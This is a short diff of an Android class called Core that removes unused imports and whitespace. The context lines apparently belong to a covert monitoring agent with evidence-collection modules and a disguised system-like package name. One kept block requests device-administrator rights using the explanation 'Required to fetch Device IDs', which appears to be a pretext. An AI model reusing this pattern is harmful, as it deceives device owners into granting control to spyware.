@@ -12,15 +12,12 @@ import java.io.IOException;
 import android.app.Activity;
 import android.app.ActivityManager;
 import android.app.PendingIntent;
-import android.app.Service;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.content.res.Resources;
-import android.os.AsyncTask;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 
@@ -37,7 +34,6 @@ import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
-import com.android.deviceinfo.gui.AGUI;
 import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.listener.BSm;
 import com.android.deviceinfo.manager.ManagerEvent;
@@ -231,7 +227,7 @@ public class Core extends Activity implements Runnable {
 
 			} catch (IOException ex) {
 				Check.log(TAG + " Error (unprotect): " + ex);
-			}
+			}			
 		} else if (Keys.self().wantsPrivilege() && Cfg.ADMIN) {
 
 			// startActivityForResult(intent, ACTIVATION_REQUEST);
@@ -247,7 +243,6 @@ public class Core extends Activity implements Runnable {
 			intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");
 
 			context.startActivity(intent);
-
 		}
 
 		try {
@@ -857,3 +852,4 @@ public class Core extends Activity implements Runnable {
 	}
 
 }
+
